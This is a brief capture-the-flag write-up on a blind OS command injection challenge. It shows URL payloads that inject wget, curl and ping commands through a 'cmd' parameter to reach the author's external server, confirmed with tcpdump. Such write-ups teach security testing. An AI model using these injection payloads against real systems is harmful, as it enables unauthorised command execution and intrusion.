## HACKIM8 - Web 3 - Blind OS command injection

In this interesting challenge, application is taking user input and passes it to a application code that runs a task on the underlying server. I have tried to execute simple OS command but I could not able to see any response so immediately I have started my EC2 amazon server and force vulnerable app to send a request to my cloud server. I have tried below steps: 
   
      http://54.89.146.217/index.php?cmd=wget%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com
      http://54.89.146.217/index.php?cmd=curl%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com
 
 None of the above command worked for me. Either application was filtering word like wget, curl or it was not allowing any outbound connection however the last try worked for me and that was ping command:
 
      http://54.89.146.217/index.php?cmd=ping%20http://ec2-35-166-203-92.us-west-2.compute.amazonaws.com

I have started tcpdump on my cloud server and I was able to see packet

![Alt text](https://github.com/sagarpopat/CTF-wirteup/blob/master/images/packet_1.PNG "Optional Title")

- OS Command might be executed on the server side but it's not reflecting back in response. 
- Server was also not accepting few utilities/commands like `wget`,`hping3`,`scapy`,`curl`,`http` and many more. 


